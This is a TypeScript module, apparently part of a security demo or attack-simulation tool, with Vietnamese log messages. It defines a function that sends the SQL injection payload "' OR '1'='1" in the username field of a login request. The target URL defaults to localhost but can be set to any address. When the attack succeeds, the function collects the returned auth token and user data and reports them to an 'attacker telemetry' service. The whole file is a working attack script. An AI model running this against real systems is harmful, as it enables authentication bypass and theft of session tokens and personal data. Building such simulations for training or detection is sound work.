import { sendAttackerTelemetry } from '../services/telemetry.service.js';

export async function runSqlInjectionAttack(targetUrl: string = 'http://localhost:3000/api/login', payload: string = "' OR '1'='1") {
  console.log(`[SQLi Attack] Bắt đầu kích hoạt tấn công SQL Injection vào: ${targetUrl}`);
  console.log(`[SQLi Attack] Payload: ${payload}`);

  await sendAttackerTelemetry('ATTACK_TRIGGERED', 'WARNING', {
    attackType: 'SQL_INJECTION',
    target: targetUrl,
    status: 'STARTED',
    payloadExample: payload
  });

  try {
    const res = await fetch(targetUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: payload,
        password: 'any_dummy_password'
      })
    });

    const responseData = await res.json();
    const success = res.ok && !!responseData.token;

    console.log(`[SQLi Attack] Kết quả: ${success ? 'THÀNH CÔNG (Auth Bypassed)' : 'THẤT BẠI'}`);

    await sendAttackerTelemetry('ATTACK_RESULT', success ? 'CRITICAL' : 'WARNING', {
      attackType: 'SQL_INJECTION',
      payload,
      success,
      capturedToken: responseData.token,
      leakedData: responseData.user
    });

    return {
      success,
      statusCode: res.status,
      data: responseData
    };
  } catch (err) {
    console.error(`[SQLi Attack] Lỗi khi thực hiện: ${(err as Error).message}`);
    return {
      success: false,
      error: (err as Error).message
    };
  }
}
